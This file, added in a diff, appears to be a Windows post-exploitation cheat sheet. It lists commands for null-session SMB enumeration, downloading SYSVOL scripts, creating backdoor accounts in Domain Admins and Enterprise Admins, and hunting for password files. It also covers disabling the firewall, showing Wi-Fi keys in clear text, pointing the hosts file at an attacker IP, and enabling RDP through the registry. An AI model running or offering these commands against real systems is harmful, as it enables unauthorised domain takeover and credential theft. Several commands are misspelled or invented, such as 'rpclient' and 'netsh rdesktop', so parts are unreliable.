@@ -1,0 +1,161 @@
+Windows
+
+
+# Anonymous users can obtain the Windows password policy
+
+msfconsole
+use auxiliary/scanner/smb/smb_enumusers 
+------------------------------------------------------------------------------------------------------
+
+# CIFS NULL Session Permitted
+
+net use \\target-IP\ipc$ "" /u:""
+------------------------------------------------------------------------------------------------------
+
+# Create an anonymous connection
+
+smbclient -N -L <target-IP>
+smbclient -W Workgroup -U ‘Lee%password’ \\\\192.168.1.105\\SYSVOL
+smb:\> recurse 
+smb:\> prompt off 
+smb:\> mget scripts
+------------------------------------------------------------------------------------------------------
+
+# Show domain users and group information
+
+DumpSec
+------------------------------------------------------------------------------------------------------
+
+# Show members of domain groups
+
+global.exe "domain admins" \\dc-controller
+------------------------------------------------------------------------------------------------------
+
+# Impersonate a Domain Admin to create Enterprise Admin credentials:
+
+net user Lee password /add /domain
+net group "Enterprise Admins" Lee /add /domain
+net groups "Enterprise Admins" /domain
+
+------------------------------------------------------------------------------------------------------
+
+nbtenum -r <target-IP>
+nbtenum -q <target-IP>
+
+rpclient -U "" <target-IP>
+
+enum -G <target-IP>
+enum -P <target-IP>
+------------------------------------------------------------------------------------------------------
+
+# Search all folders for filenames that include 'password'.
+
+dir /s /p *password*.*
+------------------------------------------------------------------------------------------------------
+
+# net commands
+
+net view                                    Computers in the users domain and other domains.
+net view /domain                            Computers in other domain.
+net user                                    Local users.
+net user /domain > users.txt                All users in the current user's domain (take a few to run).
+net localgroup                              Local Security Groups.
+net localgroup /domain                      Domain Security Groups.
+net localgroup Administrators               Users in the local Administrators Security Group.
+net localgroup Administrators /domain       Users in the domain Administrators Security Group.
+net group "ePO Admins" /domain              Users in the domain ePO Admins Security Group.
+net user "joe.smith" /domain                Info on domain user.
+net accounts                                Local password policies.
+net config workstation
+net share
+
+net user lee password /add
+net localgroup administrators /add lee
+------------------------------------------------------------------------------------------------------
+
+# Domain accounts
+
+net group “Domain Admins" /domain > domain-admin.txt
+net group “Domain Users" /domain > domain-users.txt
+
+net user lee password /add /domain
+net group "Domain Admins" lee /add /domain
+------------------------------------------------------------------------------------------------------
+
+# Enumeration
+ 
+date /t & time /t
+set
+arp -a
+ipconfig /all
+ipconfig /displaydns
+route print
+net view
+netstat -ano
+netstat -c
+netstat -vb
+netstat -ns
+netstat -ano | findstr LISTENING
+net accounts
+net accounts /domain
+net session
+net share
+net group
+net user
+net localgroup
+net localgroup administrators
+net group administrators
+net view /domain
+tasklist /svc
+tasklist /m
+gpresult /COMPUTERNAME
+gpresult /%username%
+gpresult /z
+net sessions
+nbtstat -A [IP address of target]
+nbtstat -a [name of target]
+doskey /history
+net start
+tasklist /v
+tasklist /m
+dir c:\*.doc /s
+dir c:\*.jpg /s
+dir c:\*.pdf /s
+dir c:\*.ppt /s
+dir c:\*.url /s
+dir c:\*.xls /s
+------------------------------------------------------------------------------------------------------
+
+# Firewall
+
+netsh firewall show config
+netsh firewall add portopening TCP 8081 ePO
+netsh firewall set opmode disable                  Disable firewall.
+
+firewall show state
+netsh firewall set opmode disable
+
+netsh wlan show interfaces
+netsh wlan show drivers
+netsh wlan show networks
+netsh wlan show profiles
+netsh wlan show profiles name="name"
+show profiles name="name" key=clear
+------------------------------------------------------------------------------------------------------
+
+# Local DNS spoofing
+
+echo <attacker-IP> facebook >> %WINDIR%\System32\drivers\etc\hosts
+type %WINDIR%\System32\drivers\etc\hosts
+------------------------------------------------------------------------------------------------------
+
+# Misc
+
+cd \WINDOWS\system32\
+type %SYSTEMDRIVE%\boot.ini
+type %WINDIR%\win.ini
+fsutil fsinfo drives
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+netsh rdesktop <target-IP>
